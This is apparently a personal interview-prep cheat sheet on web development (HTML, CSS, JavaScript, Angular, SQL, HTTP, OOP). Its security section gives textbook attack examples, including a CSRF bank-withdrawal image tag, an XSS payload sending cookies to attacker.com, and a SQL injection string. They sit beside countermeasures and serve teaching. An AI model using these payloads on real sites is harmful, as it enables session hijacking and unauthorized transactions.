# Tech Prep
A collection of helpful programming topics and links

<!-- MarkdownTOC depth=0 autolink=true bracket=round -->

- [Frontend](#frontend)
  - [HTML5](#html5)
    - [ID Attribute](#id-attribute)
      - [Example](#example)
    - [Class Attribute](#class-attribute)
      - [Example](#example-1)
    - [Semantic HTML](#semantic-html)
      - [Examples](#examples)
    - [New Elements, Attributes, & APIs](#new-elements-attributes--apis)
  - [CSS3](#css3)
    - [Selectors](#selectors)
    - [Flexbox](#flexbox)
      - [Resources](#resources)
    - [Media Queries](#media-queries)
      - [Examples](#examples-1)
      - [Resources](#resources-1)
    - [Responsive Web Design (RWD)](#responsive-web-design-rwd)
    - [(r)em vs. px vs. vs. pt vs. %](#rem-vs-px-vs-vs-pt-vs-%)
      - [Resources](#resources-2)
  - [JavaScript](#javascript)
    - [proto vs. prototype](#proto-vs-prototype)
    - [Publish / Subscribe (Observer)](#publish--subscribe-observer)
      - [Examples](#examples-2)
      - [Resources](#resources-3)
    - [Function Expression vs. Declaration](#function-expression-vs-declaration)
    - [call() vs. apply()](#call-vs-apply)
    - [Undefined vs. null](#undefined-vs-null)
    - [Assignment & Comparison Operators](#assignment--comparison-operators)
    - [Types](#types)
    - [Self-executing Functions](#self-executing-functions)
    - [Closures](#closures)
      - [Example](#example-2)
      - [Resources](#resources-4)
    - [OOP](#oop)
      - [Classes & Instances](#classes--instances)
      - [Inheritence & Polymorphism](#inheritence--polymorphism)
      - [Namespaces](#namespaces)
      - [Resources](#resources-5)
    - [Node](#node)
      - [Resources](#resources-6)
    - [Modularity](#modularity)
      - [Asynchronous Module Definition (AMD)](#asynchronous-module-definition-amd)
      - [CommonJS (CJS)](#commonjs-cjs)
      - [Resources](#resources-7)
    - [Grunt vs. Gulp](#grunt-vs-gulp)
    - [Angular](#angular)
      - [Modules](#modules)
      - [Two-Way Data Binding](#two-way-data-binding)
      - [Controllers](#controllers)
      - [Directives](#directives)
      - [Templates](#templates)
      - [TODO: Routing](#todo-routing)
      - [Scopes](#scopes)
      - [Services & Factories](#services--factories)
      - [Providers](#providers)
      - [Filters](#filters)
      - [Resources](#resources-8)
    - [TODO: Ember](#todo-ember)
    - [TODO: Backbone](#todo-backbone)
      - [TODO: Events](#todo-events)
      - [TODO: Model](#todo-model)
      - [TODO: Collection](#todo-collection)
      - [TODO: Router](#todo-router)
      - [TODO: History](#todo-history)
      - [TODO: Sync](#todo-sync)
      - [TODO: View](#todo-view)
    - [TODO: Karma](#todo-karma)
- [Backend](#backend)
  - [SQL](#sql)
    - [JOINs](#joins)
      - [Examples](#examples-3)
        - [Inner Join](#inner-join)
        - [Left Outer Join](#left-outer-join)
        - [Full Outer Join](#full-outer-join)
      - [Resources](#resources-9)
  - [HTTP & REST](#http--rest)
    - [Verbs](#verbs)
    - [Status Codes](#status-codes)
    - [Resources](#resources-10)
  - [OOP](#oop-1)
    - [Core Principles](#core-principles)
    - [Single Table Inheritance (STI)](#single-table-inheritance-sti)
    - [Resources](#resources-11)
  - [Ruby](#ruby)
    - [Rails](#rails)
  - [PHP](#php)
    - [PDO](#pdo)
    - [Resources](#resources-12)
  - [Java](#java)
    - [Resources](#resources-13)
- [Misc](#misc)
  - [Unix Epoch](#unix-epoch)
  - [Duck Typing](#duck-typing)
  - [Regex](#regex)
  - [Sessions](#sessions)
    - [Resources](#resources-14)
  - [Security](#security)
    - [Cross-site Request Forgery (CSRF / XSRF)](#cross-site-request-forgery-csrf--xsrf)
      - [Example](#example-3)
      - [Countermeasures](#countermeasures)
      - [Resources](#resources-15)
    - [Cross-site Scripting (XSS)](#cross-site-scripting-xss)
      - [Example](#example-4)
      - [Countermeasures](#countermeasures-1)
      - [Resources](#resources-16)
    - [CSS Injection](#css-injection)
      - [Example](#example-5)
      - [Resources](#resources-17)
    - [SQL Injection](#sql-injection)
      - [Example](#example-6)
      - [Countermeasures](#countermeasures-2)
    - [Denial of Service (DoS)](#denial-of-service-dos)
  - [Performance & Optimizations](#performance--optimizations)
- [Articles](#articles)
- [Books](#books)

<!-- /MarkdownTOC -->

## Frontend

### HTML5

#### ID Attribute
**The ID attribute provides a document-wide unique identifier for an element.** This is used to identify the element so that stylesheets can alter its presentational properties, and scripts may alter, animate or delete its contents or presentation. Appended to the URL of the page, it provides a globally unique identifier for the element, typically a sub-section of the page.

##### Example
`<div id="content"></div>`

#### Class Attribute
**The class attribute provides a way of classifying similar elements.** This can be used for semantic or presentation purposes. Multiple class values may be specified.

##### Example
`<div class="notation"></div>`

#### Semantic HTML
Describes but doesn't specify the content they enclose. Semantic HTML is the use of HTML markup to **reinforce the meaning of the information in webpages rather than merely to define its presentation**.

##### Examples

```
<div class="large-text"></div> <!-- bad: large relative to what? -->
<div class="column-left"></div> <!-- bad: what if it changes to be on the right? -->
<div class="priority-2"></div> <!-- good: like headings -->
```

#### New Elements, Attributes, & APIs
- `<article>`
- `<aside>`
- `<canvas>`
- `<details>`
- `<figcaption>`
- `<figure>`
- `<footer>`
- `<header>`
- `<main>`
- `<mark>`
- `<nav>`
- `<section>`
- `<summary>`
- `<time>`
- `data-*=""`
- Canvas
- Drag-and-drop
- Browser history management
- Web storage

---

### CSS3

#### Selectors

| Selector               | Description
|------------------------|------------
| `#id`                  | Selects the element with `id=""`
| `.class`               | Selects all elements with `class=""`
| `*`                    | Selects all elements; never use this
| `element`              | Selects all _ elements
| `element,element`      | Selects all _ and _ elements
| `element element`      | Selects any element that is a descendant
| `element > element`    | Selects any child element
| `element + element`    | Selects any element that is the next sibling
| `element ~ element`    | Selects any following sibling
| `[attribute]`          | Selects all elements with attribute
| `[attribute=value`     | Selects all elements with attribute equaling value
| `[attribute~=value]`   | Selects all elements with attribute containing value
| `[attribute|=value]`   | Selects all elements with attribute starting with value
| `[attribte^=value]`    | Selects all elements with attribute beginning with value
| `[attribute$=value]`   | Selects all elements with attribute ends with value
| `[attribute*=value]`   | Selects all elements with attribute containing substring value
| `:active`              |
| `::after`              |
| `::before`             |
| `:checked`             |
| `:disabled`            |
| `:empty`               |
| `:enabled`             |
| `:first-child`         |
| `::first-letter`       |
| `::first-line`         |
| `:first-of-type`       |
| `:focus`               |
| `:hover`               |
| `:in-range`            |
| `:invalid`             |
| `:lang(language)`      |
| `:last-child`          |
| `:last-of-type`        |
| `:link`                |
| `:not(selector)`       |
| `:nth-child(n)`        |
| `:nth-last-child(n)`   |
| `:nth-last-of-type(n)` |
| `:nth-of-type(n)`      |
| `:only-of-type`        |
| `:only-child`          |
| `:optional`            | Selects input elements with no `required` attribute
| `:out-of-range`        | Selects input elements with a value outside of the specified range
| `:read-only`           | Selects input elements with the `readonly` attribute
| `:read-write`          | Selects input elements with the `readonly` attribute not specified
| `:required`            | Selects input elements with the `required` attribute
| `:root`                | Selects the document's root element
| `::selection`          | Select the portion of an element that is selected
| `:target`              |
| `:valid`               | Selects all input elements with a valid value
| `:visited`             | Selects all visited links

#### Flexbox
The CSS3 flexbox is a layout mode providing for the arrangement of elements on a page such that the elements behave predictably when the page layout must accommodate different screen sizes and different display devices. For many applications, the flexible box model provides an improvement over the block model in that it does not use floats, nor do the flex container's margins collapse with the margins of its contents.

![Flex Terms](https://mdn.mozillademos.org/files/3739/flex_terms.png)

##### Resources
- [http://css-tricks.com/snippets/css/a-guide-to-flexbox/](http://css-tricks.com/snippets/css/a-guide-to-flexbox/)
- [https://developer.mozilla.org/en-US/docs/Web/Guide/CSS/Flexible_boxes](https://developer.mozilla.org/en-US/docs/Web/Guide/CSS/Flexible_boxes)

#### Media Queries
A media query consists of a media type and at least one expression that limits the style sheets' scope by using media features, such as width, height, and color. Media queries, added in CSS3, let the presentation of content be tailored to a specific range of output devices without having to change the content itself.

##### Examples
```
/* Extra small devices (phones, less than 768px) */
/* No media query since this is the default in Bootstrap */

/* Small devices (tablets and up) */
@media (min-width: 768px) { ... }

/* Medium devices (desktops and up) */
@media (min-width: 992px) { ... }

/* Large devices (large desktops, 1200px and up) */
@media (min-width: 1200px) { ... }

@media (min-width: 700px) and (orientation: landscape) { ... }
```

##### Resources
- [https://developer.mozilla.org/en-US/docs/Web/Guide/CSS/Media_queries](https://developer.mozilla.org/en-US/docs/Web/Guide/CSS/Media_queries)

#### Responsive Web Design (RWD)

#### (r)em vs. px vs. vs. pt vs. %
- `em` is a scalable unit that is used in web document media. An em is equal to the current font-size, for instance, if the font-size of the document is 12pt, 1em is equal to 12pt. Ems are scalable in nature, so `2em` would equal `24pt`, `.5em` would equal `6pt`, etc. Ems are becoming increasingly popular in web documents due to scalability and their mobile-device-friendly nature
- `rem` is only relative to the html (root), whereas `em` is relative to the font size of its direct or nearest parent
- `px` is fixed-size units that are used in screen media (i.e. to be read on the computer screen). One pixel is equal to one dot on the computer screen (the smallest division of your screen’s resolution). Many web designers use pixel units in web documents in order to produce a pixel-perfect representation of their site as it is rendered in the browser. One problem with the pixel unit is that it does not scale upward for visually-impaired readers or downward to fit mobile devices
- `pt` is traditionally used in print media (anything that is to be printed on paper, etc.). One point is equal to 1/72 of an inch. Points are much like pixels, in that they are fixed-size units and cannot scale in size
- `%` is much like the `em` unit, save for a few fundamental differences. First and foremost, the current font-size is equal to `100%` (i.e. `12pt` = `100%`). While using the percent unit, your text remains fully scalable for mobile devices and for accessibility

`body { font-size: 62.5%; }`

##### Resources
- [http://kyleschaeffer.com/development/css-font-size-em-vs-px-vs-pt-vs/](http://kyleschaeffer.com/development/css-font-size-em-vs-px-vs-pt-vs/)

---

### JavaScript
JavaScript is a prototype-based language in which classes are not present, and behavior reuse (known as inheritance in class-based languages) is accomplished through a process of decorating existing objects which serve as prototypes.

#### proto vs. prototype
`__proto__` is the actual object that is used in the lookup chain to resolve methods, etc.  `prototype` is the object that is used to build `__proto__` when you create an object with `new`.

```
( new Foo ).__proto__ === Foo.prototype
( new Foo ).prototype === undefined
```

![JavaScript prototype map](http://i.stack.imgur.com/KFzI3.png)

#### Publish / Subscribe (Observer)

##### Examples
```
var EventBus = {
  topics: {},

  subscribe: function(topic, listener) {
    // create the topic if not yet created
    if(!this.topics[topic]) this.topics[topic] = [];

    // add the listener
    this.topics[topic].push(listener);
  },

  publish: function(topic, data) {
    // return if the topic doesn't exist, or there are no listeners
    if(!this.topics[topic] || this.topics[topic].length < 1) return;

    // send the event to all listeners
    this.topics[topic].forEach(function(listener) {
      listener(data || {});
    });
  }
};
```

##### Resources
- [http://dev.housetrip.com/2014/09/15/decoupling-javascript-apps-using-pub-sub-pattern/](http://dev.housetrip.com/2014/09/15/decoupling-javascript-apps-using-pub-sub-pattern/)

#### Function Expression vs. Declaration
`var foo = function(){}` is a function expression defined at run-time. `function bar(){}` is a function declaration defined at parse-time.

#### call() vs. apply()
`Func.call(this, arg1, arg2, ...)`

`Func.apply(this, [arg1, arg2, ...])`

#### Undefined vs. null
For example, when declaring `var foo;`, the variable `foo` will be `undefined` because it is not yet initialized. `null`, however, is an object. Examples:

```
var foo (= undefined);
foo == null;        // true
foo === null;       // false
foo == undefined;   // true
foo === undefined;  // true
typeof foo;         // undefined

var foo = null;
foo == null;        // true
foo === null;       // true
foo == undefined;   // true
foo === undefined;  // false
typeof foo;         // object
```

#### Assignment & Comparison Operators
- A single equal (`=`) is an assignment operator. It assigns a value to a variables. For example, `var foo = "foo";`.
- Double equals (`==`) is a "weak" comparison operator that performs type coercion.
- Triple equals (`===`) is a strict comparison operator that will check for type and value.

| Condition                | `==`    | `===`
|--------------------------|---------|------
| `"1" -> 1`               | `true`  | `false`
| `"" -> 0`                | `true`  | `false`
| `"" -> false`            | `true`  | `false`
| `"" -> null`             | `false` | `false`
| `"" -> undefined`        | `false` | `false`
| `"true" -> true`         | `false` | `false`
| `null -> null`           | `true`  | `true`
| `undefined -> undefined` | `true`  | `true`
| `null -> undefined`      | `true`  | `false`
| `false -> undefined`     | `false` | `false`
| `false -> null`          | `false` | `false`

#### Types
| Expression            | Value
|-----------------------|------
| `typeof true`         | `"boolean"`
| `typeof 1`            | `"number"`
| `typeof NaN`          | `"number"`
| `typeof Infinity`     | `"number"`
| `typeof "true"`       | `"string"`
| `typeof function(){}` | `"function"`
| `typeof undefined`    | `"undefined"`
| `typeof {}`           | `"object"`
| `typeof []`           | `"object"`
| `typeof null`         | `"object"`
| `typeof new Date()`   | `"object"`

#### Self-executing Functions
```
(function(){
  // ...
})();
```

#### Closures
Closures are functions that refer to independent (free) variables. In other words, the function defined in the closure 'remembers' the environment in which it was created. A closure is a special kind of object that combines two things: a function, and the environment in which that function was created. The environment consists of any local variables that were in-scope at the time that the closure was created.

##### Example
```
var makeCounter = function () {
  var _counter = 0;

  return {
    increment: function (amount) {
      _counter = _counter + amount;
      return _counter;
    },
    decrement: function (amount) {
      _counter = _counter - amount;
      return _counter;
    },
    getCounter: function () {
      return _counter;
    }
  }
}
```

##### Resources
- [https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Closures](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Closures)

#### OOP
Redefining the prototype via `MyObject.prototype = {};` is not recommended so, instead, append to the existing prototype via `MyObject.prototype.foo = function(){};`.

##### Classes & Instances
```
// Class defintion and constructor
var Person = function(firstName, lastName){

  // Private class variable
  var age = 29;

  // Public instance variable
  this.firstName = firstName;
  this.lastName = lastName;

  // Private class method
  var getAge = function(){
    return age;
  }

  // Public instance method
  this.fullName = function(){
    return this.firstName + " " + this.lastName
  }

}

// Instantiate a new instance
var person1 = new Person();
person1.fullName();
```

##### Inheritence & Polymorphism
```
// Have John inherit from Person
John.prototype = Object.create(Person.prototype);

// Reset John's constructor to the correct one
John.prototype.constructor = John;

// Object.create polyfill
(function(){
  if (typeof Object.create !== "function") {
    Object.create = function(proto){
      function F(){};
      F.prototype = proto;
      return new F();
    }
  }
})();
```

##### Namespaces
Create a **single** global variable (usually an object `{}`) that houses all other application code. For example, `var MyApp = MyApp || {};`. From here, sub-namespaces can be created via `MyApp.store = {};`. The downsides of this are that it's still possible to incur naming collisions in your architecture, and there's no clean way to handle dependency management without some manual effort or third party tools.

##### Resources
- [https://developer.mozilla.org/en-US/docs/Web/JavaScript/Introduction_to_Object-Oriented_JavaScript](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Introduction_to_Object-Oriented_JavaScript)
- [http://javascript.crockford.com/private.html](http://javascript.crockford.com/private.html)
- [http://javascript.crockford.com/prototypal.html](http://javascript.crockford.com/prototypal.html)

#### Node
JavaScript on the server. **Node does I/O in a way that is asynchronous which lets it handle lots of different things simultaneously.** For example, if you go down to a fast food joint and order a cheeseburger they will immediately take your order and then make you wait around until the cheeseburger is ready. In the meantime they can take other orders and start cooking cheeseburgers for other people. Imagine if you had to wait at the register for your cheeseburger, blocking all other people in line from ordering while they cooked your burger! This is called blocking I/O because all I/O (cooking cheeseburgers) happens one at a time. Node, on the other hand, is non-blocking, which means it can cook many cheeseburgers at once.

##### Resources
- [https://github.com/maxogden/art-of-node](https://github.com/maxogden/art-of-node)
- [http://nodeschool.io/](http://nodeschool.io/)
- [https://github.com/rvagg/learnyounode](https://github.com/rvagg/learnyounode)

#### Modularity
When an application is modular, it generally means it's composed of a set of highly decoupled, distinct pieces of functionality stored in modules. Loose coupling facilitates easier maintainability of apps by removing dependencies where possible. When this is implemented efficiently, it's quite easy to see how changes to one part of a system may affect another.

##### Asynchronous Module Definition (AMD)
The AMD module format is a proposal for defining modules where both the module and dependencies can be asynchronously loaded. It is significantly cleaner than the present global namespace and `<script>` tag solutions. There's a clean way to declare stand-alone modules and dependencies they may have. Module definitions are encapsulated, helping us to avoid pollution of the global namespace. Browser first.

```
// Require a module
require(["dep1", "dep2"], function(dep1, dep2){
  // ...
});

// Define a module. Note that the following is a named module. Normally
// modules should be registered as anonymouse, which allows consumers of
// the module to rename the library.
define("myModule", ["dep1, "dep2"], function(dep1, dep2){
  var myModule = {
    // ...
  }
  return myModule;
});
```

##### CommonJS (CJS)
The CommonJS module proposal specifies a simple API for declaring modules server-side (Node, for example). Some of the arguments against CJS include a note that many CommonJS APIs address server-oriented features which one would simply not be able to implement at a browser-level in JavaScript -- for example, io and system could be considered unimplementable by the nature of their functionality. Server first.

```
// Require a module
var foo = require('foo');

function bar() {
  foo.doStuff();
}

// Export a module
exports.bar = bar;
```

##### Resources
- [http://addyosmani.com/writing-modular-js/](http://addyosmani.com/writing-modular-js/)
- [http://requirejs.org/docs/why.html#1](http://requirejs.org/docs/why.html#1)
- [http://browserify.org/articles.html](http://browserify.org/articles.html)
- [Browserify v2](http://vimeo.com/62988591)

#### Grunt vs. Gulp
Grunt is "configuration over code" whereas Gulp is "code over configuration". Gulp is stream-based. The Gulp API consists of `task`, `watch`, `src`, `pipe`, and `dest`.

#### Angular

##### Modules
You can think of a module as a container for the different parts of your app – controllers, services, filters, directives, etc.

##### Two-Way Data Binding
Any changes to the view are immediately reflected in the model, and any changes in the model are propagated to the view.

![Two-Way Data Binding](https://docs.angularjs.org/img/Two_Way_Data_Binding.png)

##### Controllers
A JavaScript constructor function that is used to augment the scope. Use controllers to:

- Set up the initial state of the $scope object.
- Add behavior to the $scope object.

Do not use controllers to:

- Manipulate DOM — Controllers should contain only business logic. Putting any presentation logic into Controllers significantly affects its testability. Angular has databinding for most cases and directives to encapsulate manual DOM manipulation.
- Format input — Use angular form controls instead.
- Filter output — Use angular filters instead.
- Share code or state across controllers — Use angular services instead.
- Manage the life-cycle of other components (for example, to create service instances).

##### Directives
At a high level, directives are markers on a DOM element (such as an attribute, element name, comment or CSS class) that tell AngularJS's HTML compiler ($compile) to attach a specified behavior to that DOM element or even transform the DOM element and its children.

##### Templates
Templates are written with HTML that contains Angular-specific elements and attributes. Angular combines the template with information from the model and controller to render the dynamic view that a user sees in the browser. Directives, expressions, filters, and form controls can be used.

##### TODO: Routing

##### Scopes
Scope is the glue between application controller and the view. Scope is an object that refers to the application model. It is an execution context for expressions. Scopes are arranged in hierarchical structure which mimic the DOM structure of the application. Scopes can watch expressions and propagate events.

##### Services & Factories
Angular services are substitutable objects that are wired together using dependency injection. You can use services to organize and share code across your app. The service factory function generates the single object or function that represents the service to the rest of the application. The object or function returned by the service is injected into any component.

```
var myModule = angular.module('myModule', []);
myModule.factory('serviceId', function() {
  var shinyNewServiceInstance;
  // factory function body that constructs shinyNewServiceInstance
  return shinyNewServiceInstance;
});
```

##### Providers
Each web application you build is composed of objects that collaborate to get stuff done. These objects need to be instantiated and wired together for the app to work. In Angular apps most of these objects are instantiated and wired together automatically by the injector service.

##### Filters
Formats the value of an expression for display to the user. They can be used in view templates, controllers or services and it is easy to define your own filter.

##### Resources
- [https://docs.angularjs.org/guide](https://docs.angularjs.org/guide)

#### TODO: Ember

#### TODO: Backbone
##### TODO: Events
##### TODO: Model
##### TODO: Collection
##### TODO: Router
##### TODO: History
##### TODO: Sync
##### TODO: View

#### TODO: Karma

## Backend

### SQL

#### JOINs
An **inner join** of A and B gives the result of A intersect B. An **outer join** of A and B gives the results of A union B.

##### Examples
See [http://sqlfiddle.com/#!2/0d1c7/12](http://sqlfiddle.com/#!2/0d1c7/12)

Given this schema:

| TableA | TableB
|--------|-------
| 1      | 3
| 2      | 4
| 3      | 5
| 4      | 6

> Note that (1,2) are unique to TableA, (3,4) are common to both TableA and TableB, and (5,6) are unique to TableB

###### Inner Join
Gives the intersection of two tables.

`SELECT * FROM TableA INNER JOIN TableB ON TableA.a = TableB.b`

| a | b
|---|---
| 3 | 3
| 4 | 4

###### Left Outer Join
Gives all the rows of the "left" table, plus any common rows from the other table.

`SELECT * FROM TableA LEFT OUTER JOIN TableB ON TableA.a = TableB.b`

| a | b
|---|---
| 1 | null
| 2 | null
| 3 | 3
| 4 | 4


###### Full Outer Join
Gives the union of two tables (all the rows from both tables)

`SELECT * FROM TableA FULL OUTER JOIN TableB ON TableA.a = TableB.b`

| a    | b
|------|---
| 1    | null
| 2    | null
| 3    | 3
| 4    | 4
| null | 5
| null | 6

![SQL Joins](http://i.stack.imgur.com/1UKp7.png)

##### Resources
- [http://stackoverflow.com/questions/38549/difference-between-inner-and-outer-joins](http://stackoverflow.com/questions/38549/difference-between-inner-and-outer-joins)

---

### HTTP & REST

#### Verbs

| Verb     | Description
|----------|------------
| `GET`    | Used to retrieve / read (not change) a resource (idempotent)
| `POST`   | Used to create new resources
| `PUT`    | Used to update a **complete** resource (idempotent)
| `PATCH`  | Used to update a **partial** resource (idempotent)
| `DELETE` | Used to delete a resource (idempotent)

#### Status Codes

| Status Code | Description
|-------------|------------
| 2xx         | Success
| 3xx         | Redirection
| 4xx         | Client error
| 5xx         | Server error

#### Resources
- [http://restcookbook.com/](http://restcookbook.com/)
- [http://guides.rubyonrails.org/routing.html#crud-verbs-and-actions](http://guides.rubyonrails.org/routing.html#crud-verbs-and-actions)
- [http://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods](http://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods)

---

### OOP

#### Core Principles
- **Abstraction** is used to manage complexity by decomposing complex systems into smaller components. It is the essential characteristics of an object that distinguish it from all other kinds of objects.
- **Encapsulation** is the hiding of data implementation by restricting access to accessors (get) and mutators (set).
- **Inheritance** describes the relationships between objects.
- **Polymorphism** means being able to send the same message to different objects and get different results (one name, many forms).

#### Single Table Inheritance (STI)
STI is the idea of using a single table to reflect multiple models that inherit from a base model.

#### Resources
- [Polymorphism in Ruby](http://robots.thoughtbot.com/back-to-basics-polymorphism-and-ruby)
- [SOLID](http://en.wikipedia.org/wiki/SOLID_(object-oriented_design))
- [Sandi Metz - SOLID Object-Oriented Design](http://vimeo.com/12350535)

---

### Ruby

#### Rails
- Concerns

---

### PHP

#### PDO

#### Resources
- [https://phpbestpractices.org/](https://phpbestpractices.org/)
- [http://www.phptherightway.com/](http://www.phptherightway.com/)

---

### Java

#### Resources
- [https://docs.oracle.com/javase/tutorial/java/nutsandbolts/index.html](https://docs.oracle.com/javase/tutorial/java/nutsandbolts/index.html)

## Misc

### Unix Epoch
An instant in time chosen as the origin of a particular era. The "epoch" then serves as a reference point from which time is measured. Time measurement units are counted from the epoch so that the date and time of events can be specified unambiguously.

January 1, 1970

### Duck Typing
Duck typing is only concerned with ensuring that objects behave as demanded of them in a given context, rather than ensuring that they are of a specific type. Instead of specifying types formally, duck typing practices rely on documentation, clear code, and testing to ensure correct use

---

### Regex

| Expression | Description
|------------|------------
| `[abc]`    | A single character of: a, b, or c
| `[^abc]`   | Any single character except: a, b, or c
| `[a-z]`    | Any single character in the range a-z
| `[a-zA-Z]` | Any single character in the range a-z or A-Z
| `^`        | Start of line
| `$`        | End of line
| `\A`       | Start of string
| `\z`       | End of string
| `.`        | Any single character
| `\s`       | Any whitespace character
| `\S`       | Any non-whitespace character
| `\d`       | Any digit
| `\D`       | Any non-digit
| `\w`       | Any word character (letter, number, underscore)
| `\W`       | Any non-word character
| `\b`       | Any word boundary
| `(...)`    | Capture everything enclosed
| `(a|b)`    | a or b
| `a?`       | Zero or one of a
| `a*`       | Zero or more of a
| `a+`       | One or more of a
| `a{3}`     | Exactly 3 of a
| `a{3,}`    | 3 or more of a
| `a{3,6}`   | Between 3 and 6 of a

---

### Sessions
HTTP is a stateless protocol. Sessions make it stateful.

#### Resources
- [http://machinesaredigging.com/2013/10/29/how-does-a-web-session-work/](http://machinesaredigging.com/2013/10/29/how-does-a-web-session-work/)
- [http://guides.rubyonrails.org/security.html#sessions](http://guides.rubyonrails.org/security.html#sessions)

---

### Security

#### Cross-site Request Forgery (CSRF / XSRF)
XSRF attacks works by including a link or script in a page that accesses a site to which the user is known (or is supposed) to have been authenticated. For example, one user, Alice, might be browsing a chat forum where another user, Mallory, has posted a message. Suppose that Mallory has crafted an HTML image element that references an action on Alice's bank's website (rather than an image file). If Alice's bank keeps her authentication information in a cookie, and if the cookie hasn't expired, then the attempt by Alice's browser to load the image will submit the withdrawal form with her cookie, thus authorizing a transaction without Alice's approval.

##### Example
`<img src="http://bank.example.com/withdraw?account=Alice&amount=1000000&for=Mallory">`

##### Countermeasures
- Use GET and POST requests appropriately
- Embed additional authentication data -- such as a synchronizer token -- into requests that allows the web application to detect requests from unauthorized locations

##### Resources
- [http://guides.rubyonrails.org/security.html#cross-site-request-forgery-csrf](http://guides.rubyonrails.org/security.html#cross-site-request-forgery-csrf)

#### Cross-site Scripting (XSS)
**The most common entry points are just about everywhere where the user can input data or any URL parameter. An attacker injects some code, the web application saves it and displays it on a page, later presented to a victim.** XSS can steal the cookie, hijack the session, redirect the victim to a fake website, display advertisements for the benefit of the attacker, change elements on the web site to get confidential information or install malicious software through security holes in the web browser.

##### Example
`<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>`

##### Countermeasures
**Escaping user input is essential.** It is very important to filter malicious input, but it is also important to escape the output of the web application. Whitelist filtering states the values allowed as opposed to the values not allowed. Blacklists are never complete

##### Resources
- [http://guides.rubyonrails.org/security.html#cross-site-scripting-xss](http://guides.rubyonrails.org/security.html#cross-site-scripting-xss)

#### CSS Injection
**CSS injection is actually JavaScript injection**, because some browsers (IE, some versions of Safari and others) allow JavaScript in CSS. Think twice about allowing custom CSS in your web application.

##### Example
`<div style="background:url('javascript:alert(1)')">`

##### Resources
- [http://guides.rubyonrails.org/security.html#css-injection](http://guides.rubyonrails.org/security.html#css-injection)

#### SQL Injection
SQL injection attacks aim at **influencing database queries by manipulating web application parameters**.

##### Example
```
# Given the following user input...
# ' OR 1 --

# An incorrectly written query such as...
Project.where("name = '#{params[:name]}'")

# Will result in a malicious SQL query like this...
SELECT * FROM projects WHERE name = '' OR 1 --'
```

##### Countermeasures
- Escape special SQL characters
- Rather than strings, pass an array such as `User.where("login = ? AND password = ?", user_name, password).first`

#### Denial of Service (DoS)
An attempt to make a machine or network resource unavailable to its intended users.

---

### Performance & Optimizations
- Concatentation
- Minificiation
- Reduce number of HTTP requests
- Image sprites

---

## Articles
- [http://12factor.net](http://12factor.net)

---

## Books
- [The Pragmatic Programmer](http://www.amazon.com/Pragmatic-Programmer-Journeyman-Master/dp/020161622X/ref=sr_1_1?ie=UTF8&qid=1416289440&sr=8-1&keywords=pragmatic+programmer) by Andrew Hunt
- [The Ruby Way](http://www.amazon.com/Ruby-Way-Programming-Addison-Wesley-Professional/dp/0321714636/ref=sr_1_1?ie=UTF8&qid=1416289475&sr=8-1&keywords=the+ruby+way)
- [The Rails 4 Way](http://www.amazon.com/Rails-Way-Addison-Wesley-Professional-Ruby/dp/0321944275/ref=sr_1_1?ie=UTF8&qid=1416289504&sr=8-1&keywords=the+rails+way)
- [Eloquent Ruby](http://www.amazon.com/Eloquent-Ruby-Addison-Wesley-Professional/dp/0321584104/ref=sr_1_1?ie=UTF8&qid=1416289564&sr=8-1&keywords=eloquent+ruby) by Russ Olsen
- [Mastering Regular Expressions](http://www.amazon.com/Mastering-Regular-Expressions-Jeffrey-Friedl/dp/0596528124/ref=sr_1_1?ie=UTF8&qid=1416289265&sr=8-1&keywords=Mastering+regex) by Jeffrey Friedl
- [JavaScript: The Good Parts](http://www.amazon.com/JavaScript-Good-Parts-Douglas-Crockford/dp/0596517742/ref=sr_1_1?ie=UTF8&qid=1416289323&sr=8-1&keywords=javascript+the+good+parts) by Douglas Crockford
- [Rework](http://www.amazon.com/Rework-Jason-Fried/dp/0307463745/ref=sr_1_1?ie=UTF8&qid=1416289368&sr=8-1&keywords=rework+jason+fried) by Jason Fried